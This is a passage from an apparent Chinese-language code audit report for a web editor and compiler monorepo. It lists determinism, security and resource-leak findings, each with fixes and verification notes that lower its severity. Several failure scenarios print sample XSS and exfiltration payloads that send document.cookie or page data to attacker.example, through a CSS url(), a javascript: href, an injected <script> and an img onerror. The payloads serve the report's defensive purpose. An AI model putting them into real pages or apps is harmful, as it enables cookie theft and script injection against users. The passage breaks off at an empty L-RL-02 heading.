- **类别**: determinism ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-domain-misc`

**详情**: `createNodeGraphCodeSlotProvider` 用 `left.id.localeCompare(right.id)` 对节点排序,`createAnimationCodeSlotProvider` 在 packages/animation/src/animationCodeSlotProvider.ts:102 对 timeline 做了同样的事。不指定 locale 的 `localeCompare` 使用宿主的默认 locale 和 ICU 排序表,它随运行时、ICU 构建和用户 locale 而变化,并且应用的大小写/标点权重与码元顺序不同。这两个包中其他所有有序投影都刻意使用码元比较器(nodeGraphSemanticContributionProvider.ts:47 和 animationSemanticContributionProvider.ts:51 中的 `compareText`),正是为了让 revision 绑定的投影可复现。节点 id 和 timeline id 是任意非空字符串(`readRequiredId` 不施加任何字符集限制),因此这两种比较器确实会给出不同结果。

**失败场景**: 一个包含节点 `Alpha` 和 `alpha-2` 的图:码元顺序是先 `Alpha` 后 `alpha-2`(0x41 < 0x61);而在 `en` 排序规则下,`localeCompare` 会把 `alpha-2` 排在 `Alpha` 之前(小写在三级权重上胜出,且 `-` 在一级权重上可忽略)。因此 `listSlots()` 在完整 ICU 的 Node 构建上与在小 ICU 构建上返回的 slot 顺序不同,在 `sv` 或 `tr` 这类 locale 的用户下又会不同。任何渲染或哈希该 slot 列表的使用方——以及针对它的任何 golden/一致性比较——都无法跨环境复现。

**修复建议**: 把这两处调用点替换为语义提供者使用的同一个码元比较器,例如 `(left, right) => (left.id < right.id ? -1 : left.id > right.id ? 1 : 0)`,或者从共享模块导出 `compareText` 并复用。

**验证备注**: 代码事实是准确的:nodeGraphCodeSlotProvider.ts:53-55 和 animationCodeSlotProvider.ts:101-103 使用裸 `localeCompare` 排序,而同一批包中的语义贡献提供者使用码元 `compareText`(nodeGraphSemanticContributionProvider.ts:47、animationSemanticContributionProvider.ts:51),且依赖 locale/ICU 的排序确实不可复现。但所声称的影响范围缺乏支撑。(a) 没有任何 golden 或一致性测试覆盖 CodeSlot 排序——`git grep CodeSlot -- packages/golden-conformance/src` 结果为空。(b) 聚合注册表本来就不排序:codeSlotRegistry.ts:41-53 按 Map 插入顺序对提供者做 flatMap,因此在使用方边界上从来就不存在规范的 slot 序列保证。(c) 对确定性敏感的使用方会用码元比较器重新排序:codeRefactorImpact.ts:105-110 按 `compareText(slotId)` 对绑定排序,并通过 uniqueSorted 派生 `referenceIds`/`impactedSymbolIds`;由 listBindingProjections 产生的诊断会被 @prodivix/diagnostics 重新排序。(d) `localeCompare` 是整个仓库的惯例(apps/web 以及 packages/diagnostics、data-mock、pir-react-renderer、golden-conformance 中有 40 多处),因此这属于包内一致性的小瑕疵,而不是 revision 绑定投影被破坏。我能确认的唯一可观察影响是 CodeAuthoringWorkspace.tsx:462 处的 UI 列表顺序。严重级别由 medium 修正为 low。

#### 4.4.5 安全(security)

##### L-SEC-01 Workspace 文档 id 未经转义就被插值进生效的 <style> 元素,使得导入的 Workspace 可以注入 CSS

- **位置**: [`apps/web/src/editor/features/resources/PublicResourcePage.tsx:908`](apps/web/src/editor/features/resources/PublicResourcePage.tsx#L908)
- **类别**: security ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-resources-issues`

**详情**: `fontFamilyName` 由 `prodivix-font-${selectedNode.id}` 构造(第 681-682 行),其中 `selectedNode.id` 是原始的 Workspace 文档 id,随后被作为未加引号的 CSS `font-family` 值插值进 React `<style>` 元素的文本中。React 不会对 `<style>` 子节点中的 CSS 做转义——它把字符串原样写入元素的文本内容。`packages/workspace/src/workspaceDocumentValidation.ts:195-204` 只要求文档 id 是与其 `docsById` 键相匹配的非空去空白字符串;没有任何字符集限制,而 asset 文档可能来自 Workspace/项目导入、Git projection 或后端,而非来自会做净化的 `createWorkspaceResourceDocumentId`。id 中任何一个 `}` 都会终止 `@font-face` 块,其后的内容都会在编辑器源(origin)中被当作顶层 CSS 解析。

**失败场景**: 用户导入一个共享项目,其 asset 文档 id 为 `f}*{background:url(https://attacker.example/leak)}x`,且 `content.category === 'font'`。打开 Resources → Public 并选中该资产时,会渲染出 `<style>@font-face{font-family:prodivix-font-f}*{background:url(https://attacker.example/leak)}x;src:url(blob:...);}</style>`,于是攻击者控制的 CSS 规则(加载外部资源、全视口覆盖层、基于属性选择器的取值外泄)会在编辑器源中执行。

**修复建议**: 从经过净化的 token 派生字体族名(例如 `prodivix-font-` 加上一个哈希,或 `id.replace(/[^a-zA-Z0-9_-]/g, '_')`),以及/或者通过 `CSS.escape` 输出;也可以改用 `CSSStyleSheet.insertRule` 配合已转义的标识符来设置 `@font-face`,而不是原始字符串插值。

**验证备注**: 代码完全吻合:PublicResourcePage.tsx:681-682 构造 `prodivix-font-${selectedNode.id}`,第 908 行把它插值进 `<style>{`@font-face{font-family:${fontFamilyName};...}`}</style>`。`selectedNode.id` 是原始的 Workspace 文档 id(workspacePublicResources.ts 对文件节点设置 `id: document.id`),而 packages/workspace/src/workspaceDocumentValidation.ts(WKS_DOCUMENT_ID_MISMATCH)只要求它是等于其 docsById 键的非空去空白字符串——我在 packages/workspace 或 apps/backend 中都没有找到任何字符集限制(后端唯一的 id 正则,vfs_tree.go:73 的 `nonIdentifierPathChars`,作用于由路径派生的标识符,而非 docsById 的键)。因此转义缺口是真实的。但所声称的失败场景并不可达:我找不到任何不可信的 id 来源。生产中每一个 asset 文档创建方都会做净化——apps/web 中创建 asset 文档的唯一位置是 PublicResourcePage.tsx:430,经由 `createWorkspaceResourceDocumentId`(`[^a-zA-Z0-9_-]+ -> _`);运行时文件系统采纳的 id 形如 `runtime-asset:<sha256 hex>`(runtimeFilesystemProposalAnalysis.ts:199 + runtime-core/executionFilesystemDiff.ts:274);其余产生 `type: 'asset'` 的地方只有 golden-conformance 的夹具。系统中不存在从文件导入项目/workspace 的入口(apps/web 中仅有的 `type="file"` 输入是头像上传、i18n JSON 导入和资产上传),`importLocalProject` 读取的是用户自己的 IndexedDB 记录,社区端点只暴露 `published_pir_json`(project/community_store.go:106-109),而非所有者的协作者只获得执行角色(remoteexecution/store.go),从不具备编辑写入权限。因此要植入带 `}` 的 id,只能由 workspace 所有者自行构造 API 请求——属于 self-XSS,而非跨越信任边界。这是一处真实的加固缺陷,但 'high' 站不住脚。

##### L-SEC-02 生成的 React 与 Vue 运行时把未经校验的 PIR `open-url` href 直接传给 `window.open`,使导出的应用中可以执行 `javascript:`

- **位置**: [`packages/prodivix-compiler/src/react/workspaceProject.ts:822`](packages/prodivix-compiler/src/react/workspaceProject.ts#L822)
- **类别**: security ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-compiler-targets`

**详情**: 生成的 `workspacePirRuntime.dispatchTrigger` 在调用 `window.open(binding.href, '_blank', 'noopener,noreferrer')` 之前只检查 `typeof binding.href === 'string'`。`packages/pir/src/codec/pirCodec.ts:438-453` 对 `open-url` 也只用 `checkString(object.href)` 校验 —— 整条流水线上都没有协议白名单。`window.open('javascript:...')` 会在一个继承了 opener 源的文档中运行该脚本,因此存储在 PIR 文档中的恶意 href 就会在导出的生产应用中变成存储型 XSS(可完全访问同源存储、脚本可读的 cookie,以及应用的 `dispatchWorkspaceRouteAction` 导出)。Vue 目标在 `packages/prodivix-compiler/src/vue/workspaceApp.ts:537` 处生成了完全相同的代码。

**失败场景**: 某个导入/共享/AI 生成的 Workspace 中包含一个元素,其 `events: { activate: { kind: 'open-url', href: "javascript:fetch('https://attacker.example/x?c='+document.cookie)" } }`。该 Workspace 编译时不产生任何诊断。在导出的应用中,用户点击该元素后 `window.open` 会以部署应用的源执行该载荷,窃取会话数据。`data:text/html,...` 形式的 href 是同一缺口的第二种变体。

**修复建议**: 在两个生成的运行时中,导航前先解析 href 并对协议做白名单,例如 `const url = new URL(binding.href, window.location.href); if (url.protocol !== 'http:' && url.protocol !== 'https:' && url.protocol !== 'mailto:') return;`(用 try/catch 包裹),然后再 `window.open(url.href, '_blank', 'noopener,noreferrer')`。理想情况下还应在编译期以导出诊断拒绝非 http(s) 协议。

**验证备注**: 所引代码在 react/workspaceProject.ts:822 与 vue/workspaceApp.ts:537 处完全准确,pirCodec.ts:437-453 对 open-url 也只用 checkString(href) 校验 —— 全流程没有任何协议白名单,而仓库在别处确实自有安全 URL 辅助函数(packages/shared/src/safety,resolveSafeEmbedUrl 会拒绝 'javascript:')。因此生成的生产代码中 URL 汇聚点缺少白名单这一点是真实的。但该主张的其余部分都被夸大,'high' 站不住脚。(1) href 从不由运行时/数据驱动:compileTriggerHandler 生成的是 `binding: ${toJson(trigger)}`,即一个编译期 JSON 字面量,因此没有任何终端用户或 API 数据能到达 window.open —— 它不是存储型 XSS,只是 PIR 作者自己写下的字符串。(2) 编辑器的创作路径无法产生它:bindingProjection.ts:232 只有在 getNavigateLinkKind(destination) === 'external' 时才发出 kind 'open-url',而 router/routeNavigation.ts 只把 http:// 和 https:// 归类为 external。因此恶意 href 必须来自导入、AI 生成或直接调用 API 的 PIR 文档。(3) 利用方式本身尚未证实:该调用传入了 'noopener,noreferrer',会创建一个发起方无法脚本控制的、断开关联的顶层上下文,而我无法演示 javascript: 的执行(在我的环境中没有用户激活时弹窗被拦截,因此带 noopener 的调用与普通探针都返回 null 且未设置任何 localStorage —— 结论不确定,并不构成支持)。(4) 'data:text/html' 变体被直接证伪:现代浏览器会阻止顶层 data: 导航。可作为 low 级别的加固缺口成立:生成的运行时应把 open-url 限制为 http/https,而不是依赖编辑器侧的过滤。

##### L-SEC-03 未转义的项目名被插值进生成的 index.html <title>,向导出应用注入任意 HTML/JS

- **位置**: [`packages/prodivix-compiler/src/export/presets/reactVite.ts:138`](packages/prodivix-compiler/src/export/presets/reactVite.ts#L138)
- **类别**: security ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-compiler-core`

**详情**: `context.projectName` 是一个自由格式、由用户/协作者控制的字符串(`apps/web/.../ExportCode.tsx` 传入 `projectName?.trim() || workspaceSnapshot.name`;react/workspaceProject.ts 使用 `options.projectName ?? workspace.name`)。包名路径会对它做净化(`normalizePackageName`,reactVite.ts:39-47 / `packageName`,vueVite.ts:30-36),但 `index.html` 模板把它原样插值进 HTML 文本。`vueVite.ts:123` 存在同样的原样插值。导出的项目会被下载、构建并公开部署,因此这是对已发布产物的存储型注入,而不仅仅是预览层面的问题。

**失败场景**: 某个项目(或一个导入/共享的 workspace)被命名为 `Store</title><script>fetch('https://attacker.example/'+document.cookie)</script>`。导出后生成的 `index.html` 中包含一个可执行的 `<script>` 标签;`vite build` 把它复制进 `dist/index.html`,已部署导出站点的每一位访问者都会在该部署 origin 下执行攻击者的脚本。

**修复建议**: 在 `reactVite.ts` 和 `vueVite.ts` 中,把插值内容嵌入 `<title>` 元素之前先做 HTML 转义(`&`、`<`、`>`、`"`、`'`)—— 例如在 `normalizePackageName` 旁边提供一个共享的 `escapeHtmlText(context.projectName)` 辅助函数。

**验证备注**: 原样插值确实存在:reactVite.ts:138 与 vueVite.ts:123 都输出 `<title>${context.projectName}</title>` 且没有任何 HTML 转义,而只有包名路径做了净化(normalizePackageName,reactVite.ts:39-47)。ExportCode.tsx:113/121 传入 `projectName?.trim() || workspaceSnapshot.name`,后端对项目名也只应用了 strings.TrimSpace(project/store.go:52,174)—— 任何地方都没有字符校验。所以这个缺陷(缺少输出编码)是真实的。但所声称的 'high security' 定性在本代码库中并不成立。我查找了该失败场景所需的不可信输入路径,它并不存在:apps/backend/internal/modules/project 中没有协作者/角色概念,不存在项目/workspace 导入处理器(在 apps 和 packages 中 grep projectImport/importProject/ImportProject 无任何结果),而社区端点(handlers.go:201-232)只返回 ProjectSummary 元数据 —— 它们不会把另一个用户的 Workspace 交给导出器。因此项目名始终由编写该 Workspace 的同一主体编写,而该主体本来就能让任意代码原样进入产物包:一个 ts/js 代码文档会变成 ExportModule,其内容原封不动地输出为 src/*.tsx(在 claim 0 的探针中得到证实,用户源码逐字节出现为 src/App.tsx)。把 script 标签注入 <title> 并没有赋予导出者任何它尚未拥有的能力,因此没有跨越任何权限边界,在任何有意义的威胁模型下这都不是存储型 XSS。站得住脚的影响是输出正确性:一个包含 '<' 的普通项目名(例如 'Store <beta>')会让发布的 index.html 变成格式错误的 HTML。确认为真实的转义缺陷,严重级别下调为 low。

##### L-SEC-04 `dangerouslySetInnerHTML` 只在 void 元素路径上被剥离,因此作者可控的 props 会到达宿主元素

- **位置**: [`packages/pir-react-renderer/src/node/PIRElementProjection.tsx:152`](packages/pir-react-renderer/src/node/PIRElementProjection.tsx#L152)
- **类别**: security ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-pir`

**详情**: `stripChildProps`(runtime/reactProjection.ts:87-94)明确删除 `children` 和 `dangerouslySetInnerHTML`,但只有在 `supportsChildren` 为 false 时才会应用(第 146 行)。第 152 行支持子节点的分支把 `props` 原样展开到 `Component` 上。`props` 来自 `node.props`,其键完全不受约束:`pirCodec.ts:882` 中的 `checkRecordValues(object.props, ...)` 遍历 `Object.entries` 而没有任何键白名单,`pirValidator` 也从不限制 prop 名称。另一分支上显式的剥离表明,其意图就是这个 prop 绝不应到达 React。

**失败场景**: 某个 PIR 文档(导入的项目、AI 编写的文档或插件产出的片段)包含 `{ kind:'element', type:'div', props: { dangerouslySetInnerHTML: { kind:'literal', value: { __html: '<img src=x onerror=alert(document.cookie)>' } } } }`。它能正常解码并通过校验。渲染时 `div` 的 `supportsChildren` 为 true,于是会创建带有 `dangerouslySetInnerHTML` 和非空 children 数组的 `<div {...props}>{leadingChildren}{renderChildren?.(scoped)}</div>`;react-dom 的 `assertValidProps` 抛出 "Can only set one of `children` or `props.dangerouslySetInnerHTML`",整个渲染子树随之崩溃。对于任何把剩余 props 转发到不带子节点的 DOM 节点的宿主条目,同一文档会直接注入原始 HTML。

**修复建议**: 在两个分支上应用相同的净化 —— 例如统一通过一个共享的 `sanitizeHostProps()` 构建 `props`,该函数始终删除 `dangerouslySetInnerHTML`(在 void 路径上还删除 `children`)。更好的做法是在 `pirCodec.checkElementNode` 中拒绝 `dangerouslySetInnerHTML` 作为 prop 键,使它根本无法被持久化进 canonical PIR 文档。

**验证备注**: 机械性事实成立:stripChildProps(reactProjection.ts:87-94)删除 `children` 和 `dangerouslySetInnerHTML`,且只在 `!supportsChildren` 分支上应用(PIRElementProjection.tsx:144-148);第 152 行的分支原样展开 `props`,并且不存在键白名单(pirCodec.ts:881-883 遍历 Object.entries;pirBindingValidator.ts:381 只校验绑定值,从不校验 prop 名称)。因此一个可解码的文档确实会到达 `<Component {...props}>{a}{b}</Component>`,同时带有非空 children 数组和 dangerouslySetInnerHTML,而 react-dom 的 assertValidProps 会抛出异常 —— 仓库中也没有 ErrorBoundary。但审查者的两个关键推断是错的。第一,关于意图的论证:stripChildProps 的存在是为了 void/无子元素的有效性(React 拒绝携带 children **或** dangerouslySetInnerHTML 的 void 标签),而不是作为净化器 —— 它同时删除 `children`,任何净化器都不需要这么做。第二,安全定性:在真实宿主中,每个支持子节点的类型都解析为 HTML 标签字符串或 Pdx 组件(registry.ts:246-305 —— 所有 Pdx 叶子/void 条目都使用 prodivixLeafAdapter 且 supportsChildren:false,因此走剥离分支),所以可观测的结果是抛出异常而不是 HTML 注入;那个“把剩余 props 转发到不带子节点的 DOM 节点”的组件是假设出来的。而且 PIR 文档作者本就控制着元素类型、事件触发器和 `code` 值绑定,因此把 HTML 注入到该文档自身的渲染树中并没有跨越任何权限边界。残余的真实缺陷是:一个符合 schema 的文档会让渲染器崩溃 —— 属于正确性/健壮性问题,low。

##### L-SEC-05 宿主侧文件系统 diff 的重新校验遗漏了它向 sandbox 声明为 provider 管理的 Server Function 传输路径

- **位置**: [`apps/remote-runner-worker/src/rootlessPodmanSandbox.ts:677`](apps/remote-runner-worker/src/rootlessPodmanSandbox.ts#L677)
- **类别**: security ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `app-runner-worker`

**详情**: `createRootlessPodmanSandboxWirePayload` 告诉 sandbox:`serverFunctionPlan.invocationFilePath`、`resultFilePath`、`ISOLATED_SERVER_FUNCTION_AUTHORITY_PATH` 和 `ISOLATED_SERVER_FUNCTION_SECRET_MATERIAL_PATH` 由 provider 管理,绝不能出现在 diff 中(第 315-326 行)。而 `canonicalizeSandboxFilesystemDiff` 用来独立复检 sandbox 返回的*不可信* diff 的 `filesystemCapturePolicy`,构造的却是另一个更小的集合:它只列出测试报告路径和 Server Runtime 测试 trace 路径,并且调用 `projectExecutableProjectRuntimeFiles(snapshot)` 时不传执行 profile(而 payload 是传了 profile 的)。因此宿主的重新校验严格弱于它本应独立执行的策略,这使规范化器的既定目的落空(“Sandbox filesystem diff cannot supply trusted source trace” / 对 provider 管理路径的拒绝)。

**失败场景**: 一个被攻陷或有缺陷的 sandbox 入口发出 diff 变更 `{kind:'added', path:'.prodivix/server-function-authority.json', runtime:{contents:<AuthPrincipal + permission list>}}`。由于该路径不在宿主的 `ignoredPaths` 中,`filesystemPathIsIgnored` 返回 false;`files.get(path)` 为 undefined,因此 `(change.kind === 'added') !== !file` 通过;该变更被规范化进已发布的 `filesystem-diff:<digest>` artifact。authority 投影(principal 身份与已授予的权限)由此成为持久 artifact,以及一项用户可采纳的 Workspace 变更提案。其次,当 `profile === 'build'` 时,宿主会忽略 `.prodivix/data-mock-provision.json` 而 sandbox 不会,因此写入该路径的构建会让宿主抛出 'Sandbox filesystem diff contains a provider-managed path',把一次成功的构建变成 `invalid-sandbox-result`。

**修复建议**: 从构造 wire payload 所用的同一批输入派生出唯一的策略对象(向 `projectExecutableProjectRuntimeFiles` 传入 `profile`,并在 `snapshot.serverFunctionPlan` 存在时纳入那四条 `.prodivix/server-function-*` 传输路径),并将其同时用于 `installPayload.ignoredPaths` 和 `filesystemCapturePolicy`。

**验证备注**: 这种分歧确实存在。createRootlessPodmanSandboxWirePayload 声明 ignoredPaths = testPlan.reportFilePath、SERVER_RUNTIME_TEST_INVOCATION_TRACE_FILE_PATH、serverFunctionPlan.invocationFilePath、resultFilePath、ISOLATED_SERVER_FUNCTION_AUTHORITY_PATH、ISOLATED_SERVER_FUNCTION_SECRET_MATERIAL_PATH(rootlessPodmanSandbox.ts:315-326),而 filesystemCapturePolicy(675-694)遗漏了全部四条 Server Function 路径,canonicalizeSandboxFilesystemDiff(723-793,在 1092 处对任何 profile 都会调用)才是针对不可信 diff 的独立复检。一个伪造的 '.prodivix/server-function-authority.json' 变更能通过 filesystemPathIsIgnored,能通过 added/kind 检查(files.get -> undefined),并被规范化进已发布的 filesystem-diff artifact。profile 的不对称也得到确认,且方向与审查者所述一致:在 operation 为 undefined 的情况下调用 projectExecutableProjectRuntimeFiles(snapshot) 满足 `operation !== 'build'`(executableProject.ts:535-542),因此即使在 build 下宿主也会忽略 data-mock-provision 路径,而 sandbox(payload 以 profile 'build' 构建)不会。严重级别由 medium 修正为 low:唯一能触发它的行为体是被攻陷或有缺陷的 sandbox,而这样的 sandbox 本就能在普通的非保留路径下发出任意内容;价值最高的情形(Secret 材料)已被独立覆盖——workerAgent.ts:323-327 用 Object.values(serverFunctionSecrets.fields) 为 redactValues 播种,rootlessPodmanSandbox.ts:1566 运行 outputGuard.inspectValue('artifact-content', artifacts) 来置位 secretLeakDetected。残余影响是纵深防御/一致性缺口,外加保留路径的采纳干扰,而不是可被利用的机密泄露路径。

##### L-SEC-06 Worker 认证使用源自请求体、可经原型链到达的键来查找共享密钥

- **位置**: [`apps/remote-runner-control-plane/src/main.ts:272`](apps/remote-runner-control-plane/src/main.ts#L272)
- **类别**: security ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `app-runner-cp-hosts`

**详情**: `workerTokenById` 由 `Object.fromEntries(...)` 构建,因此它仍然继承 `Object.prototype`。`workerId` 完全由攻击者控制——它直接来自不可信请求体,经 `httpHandler.ts` 中的 `text(body.workerId)` 取得——并被用作方括号查找键。对于任何 `Object.prototype` 成员名,查找返回的是一个函数而非 `undefined`,因此 `expected !== undefined` 守卫得以通过,`secretEqual` 被以非字符串调用。这是所有 `/internal/v1/*` 路由的凭据比较路径,它应该使用 `Map` 查找或 `Object.hasOwn` 检查,而不是读取继承属性。

**失败场景**: 未认证的客户端发送 `POST /internal/v1/claims`,携带 `Authorization: Bearer anything` 和请求体 `{"workerId":"valueOf","providerId":"p","leaseDurationMs":1000}`。`workerTokenById['valueOf']` 解析为 `Object.prototype.valueOf`(一个函数,而非 `undefined`),因此 `secretEqual('anything', <function>)` 会执行 `Buffer.from(<function>)` 并抛出 `ERR_INVALID_ARG_TYPE`(一个 `TypeError`)。该异常逃出 `workerAuth`,被 `httpHandler.ts:931-945` 中的通用处理器 catch 捕获,并因 `caught instanceof TypeError` 被归类为 HTTP **400 `invalid-request`**,而不是本应的 **403 `forbidden`**。这一状态码差异构成了一个可靠的预言机,能区分原型成员名与真实/不存在的 worker id,而且认证决策路径正在一个从来不是配置凭据的值上执行。

**修复建议**: 把凭据存放在由校验过的条目构建的 `Map<string, string>` 中(或用 `Object.hasOwn(workerTokenById, workerId) && typeof expected === 'string'` 加以守卫),使只有自有的、字符串值的条目才能到达 `secretEqual`。

**验证备注**: 已做机械化验证。main.ts:108 的 `workerTokens()` 返回 `Object.freeze(Object.fromEntries(entries))`,其原型链中仍保留 Object.prototype(冻结并不阻止继承读取)。`workerId` 由攻击者控制:httpHandler.ts:490/517/552/601/632/677/728/770/808 全都执行 `text(body.workerId)`,而 `text` 只检查非空/已 trim/<=4096——'valueOf' 能通过。我在 Node v26.3.0 上执行了这条确切路径:`Object.fromEntries([['worker-1','tok']])['valueOf']` 的 `typeof` 为 function,`!== undefined` 为真,`Buffer.from(<function>)` 抛出 `TypeError ERR_INVALID_ARG_TYPE`(toString、constructor、hasOwnProperty、**proto**、isPrototypeOf 同理)。该 TypeError 逃出异步的 `authenticateWorker`,在 `workerAuth`(httpHandler.ts:275)中被 await,到达通用 catch(httpHandler.ts:925-945),并被归类为 `caught instanceof TypeError` -> 400 'invalid-request',而非第 276 行的 403 'forbidden'。因此可经原型链到达的查找与状态码偏差都是真实的。但安全定性被推翻:`secretEqual` 对非字符串永远不可能返回 true——它总是抛出——因此不存在认证绕过,也没有任何凭据比较真的成功。这个“预言机”只限于大约 10 个固定的 Object.prototype 成员名,并不泄露哪些 worker id 被配置过(一个存在但令牌错误的 id 和一个完全未知的 id 都会得到 403)。这是一个卫生缺陷(应当使用 Map 或 Object.hasOwn),后果只是状态码上的表面差异。严重级别由 medium 修正为 low。

##### L-SEC-07 Worker 侧的文件系统 diff 规范化在忽略集合中遗漏了 Server Function 的 secret/authority 路径,使不受信任的 sandbox 结果能把它们作为 artifact 发布

- **位置**: [`apps/remote-runner-worker/src/rootlessPodmanSandbox.ts:677`](apps/remote-runner-worker/src/rootlessPodmanSandbox.ts#L677)
- **类别**: security ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `xcut-security`

**详情**: worker 把 sandbox 的 stdout 信封视为不可信,并重新规范化文件系统 diff(`canonicalizeSandboxFilesystemDiff`,第 723 行),拒绝任何路径命中 `filesystemPathIsIgnored` 的变更。但 `filesystemCapturePolicy` 构建忽略集合时只用了 `testPlan.reportFilePath`、`SERVER_RUNTIME_TEST_INVOCATION_TRACE_FILE_PATH` 以及 `projectExecutableProjectRuntimeFiles(snapshot)` 的非 canonical 条目 —— 而 `projectExecutableProjectRuntimeFiles`(packages/runtime-core/src/executableProject.ts:515)从不产出 `.prodivix/server-function-*.json` 这些路径。送*进* sandbox 的 wire 载荷却确实列出了它们(315-326 行:`invocationFilePath`、`resultFilePath`、`ISOLATED_SERVER_FUNCTION_AUTHORITY_PATH`、`ISOLATED_SERVER_FUNCTION_SECRET_MATERIAL_PATH`)。因此受信任侧的检查严格弱于它本应重新校验的策略,这就使得重新规范化一份不可信结果的整个目的落空。

**失败场景**: 一次生产(Server Function)执行在容器中以与受信任的 `entry.mjs`(PID 1)相同的 uid 运行不受信任的项目代码。该代码向 `/proc/1/fd/1` 写入一个 `prodivix.sandbox-result.v1` 信封,其中包含一个文件系统 diff artifact,内含一处路径为 `.prodivix/server-function-secrets.json` 的 `added` 变更,其 `runtime.contents` 是解密后 secret 材料的 base64。`canonicalizeSandboxFilesystemDiff` 在 `policy.ignoredPaths`(其中没有该路径)和 `snapshot.files`(其中也没有)中查找,得出 `kind === 'added'` 一致的结论,并把这处变更原样重新发布。该 diff 随后作为 `execution:<id>` 作用域的 artifact 上传到 control plane,任何持有该作用域的主体都可以下载。

**修复建议**: 让两个忽略集合都从同一个导出的辅助函数派生,使它们不可能漂移。具体做法是:把同样的 `snapshot.serverFunctionPlan ? [invocationFilePath, resultFilePath, ISOLATED_SERVER_FUNCTION_AUTHORITY_PATH, ISOLATED_SERVER_FUNCTION_SECRET_MATERIAL_PATH] : []` 代码块加入 `filesystemCapturePolicy`,并额外无条件拒绝任何路径以 `.prodivix/` 开头的 diff 变更。

**验证备注**: 事实前提已核实:filesystemCapturePolicy(rootlessPodmanSandbox.ts:675-681)构建 ignoredPaths 时只用了 testPlan.reportFilePath、SERVER_RUNTIME_TEST_INVOCATION_TRACE_FILE_PATH 和 projectExecutableProjectRuntimeFiles 的非 canonical 条目,而 projectExecutableProjectRuntimeFiles(executableProject.ts:513-562)可证明只产出 snapshot.files 加上 data-runtime manifest、data mock provision 与 server-runtime mock provision —— 从不产出 wire 载荷在 315-326 行列出的 serverFunctionPlan invocation/result/authority/secret 路径。所以受信任侧的忽略集合确实弱于 wire 策略。但所声称的安全后果并不成立,因此严重程度被严重高估。canonicalizeSandboxFilesystemDiff 只会对被忽略的路径抛出异常;对任何不在 snapshot.files 中的路径,它都会接受带任意内容的 `kind === 'added'`。因此恶意 sandbox 只要把变更命名为 `debug.txt` 或任何其他未被忽略的路径,本就能外泄同样的 secret 材料 —— 这四个缺失条目并没有赋予攻击者任何它本不具备的能力。该忽略集合是一个 provider 托管路径的过滤器,而不是保密性控制;真正的 artifact 保密性控制是 secret 泄漏守卫(第 3 条结论)。诚实执行路径同样不受影响:entry.mjs 收到的是完整的 wire ignoredPaths(在 725-731 行校验,在 749-751/358 应用),因此它永远不会输出那些路径。仅确认为纵深防御/一致性缺口。

#### 4.4.6 资源泄漏(resource-leak)

##### L-RL-01 palette 状态轮换的 `setInterval` 在卡片处于悬停状态下卸载时泄漏,造成永久性的 1.2 秒重渲染循环

- **位置**: [`apps/web/src/editor/features/blueprint/editor/controller/useBlueprintEditorController.ts:860`](apps/web/src/editor/features/blueprint/editor/controller/useBlueprintEditorController.ts#L860)
- **类别**: resource-leak ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-blueprint`

**详情**: `startStatusCycle` 绑定在 palette 卡片的 `onMouseEnter` 上,而 `stopStatusCycle` 只绑定在 `onMouseLeave` 上(SidebarComponentList.tsx:159-168)。当一个处于悬停状态的元素被卸载时 React 不会触发 `mouseleave`,因此任何在指针悬停其上时移除该卡片的代码路径,都会让该 interval 继续注册在 `statusTimers.current` 中。唯一的另一处清理点是控制器的卸载清理(第 285-294 行),而只要编辑器仍然挂载,它就不会运行。这个被遗弃的 interval 会每 1200 ms 在顶层 Blueprint 控制器上调用一次 `setStatusSelections`,永久性地重渲染整个编辑器(侧边栏、树、画布、Inspector)。

**失败场景**: 作者把指针停在一张具有两个或更多状态选项的 palette 卡片上(状态轮换 interval 启动)。在不移动鼠标的情况下按下 `Ctrl+Alt+J`,即 BlueprintEditor.tsx:221-224 中注册的侧边栏折叠快捷键。`BlueprintEditorSidebar` 卸载了该卡片,`onMouseLeave` 从不触发,`stopStatusCycle` 从不被调用,`statusTimers.current[itemId]` 在本次编辑会话的剩余时间里每 1.2 秒继续触发 `setStatusSelections`,每次都强制整个 Blueprint 重渲染。

**修复建议**: 让 interval 归属于悬停元素所在之处:在卡片组件中启动它,并从 `useEffect` 清理函数中清除,这样卸载时一定会停止。如果计时器映射必须留在控制器中,至少也要让卡片在卸载 effect 中调用 `onStatusCycleStop(item.id)`,而不只是在 `onMouseLeave` 中调用。

**验证备注**: 证据完全一致(useBlueprintEditorController.ts:860-869;stop 在 870-874;仅卸载时的批量清理在 285-293)。SidebarComponentList.tsx:159-168 只把 onStatusCycleStart/Stop 绑定到卡片的 onMouseEnter/onMouseLeave,而 BlueprintEditorSidebar.tsx:186 渲染的是 `{!isCollapsed && <SidebarComponentList .../>}`,因此 Ctrl+Alt+J(BlueprintEditor.tsx:221 -> sidebar.onToggleCollapse)确实会卸载一张处于悬停状态的卡片;React 不会在卸载时合成 mouseleave,而已分离节点的原生 mouseout 也到不了 React 的根委托,所以 stopStatusCycle 被跳过,interval id 留在 statusTimers.current 中。`total < 2` 的守卫是可以满足的:PROGRESS_STATUSES(DataGroup.tsx:23)和 MESSAGE_TYPES/NOTIFICATION_TYPES(FeedbackGroup.tsx:19-20)各有 4 个条目。每次 tick 都会构造一个新对象,而 statusSelections 位于 BlueprintEditor.tsx:123 所消费的控制器中,因此每 1.2 秒一次的整编辑器重渲染是真实的。严重性下调:审查者夸大了"永久"这一点(重新悬停同一张卡片会调用 startStatusCycle,它在第 862 行清除陈旧的 interval,随后的 mouseleave 就能正常清理),触发条件要求在悬停时卸载(快捷键折叠或搜索过滤),且后果仅是无谓的渲染/CPU 开销 —— 没有状态损坏、没有 canonical 写入、也没有无界增长(每个 item id 只有一个计时器)。

##### L-RL-02 过期会话与过期/已吊销的 environment 授权在首次迁移运行之后再也不会被清理

- **位置**: [`apps/backend/internal/modules/auth/store.go:184`](apps/backend/internal/modules/auth/store.go#L184)
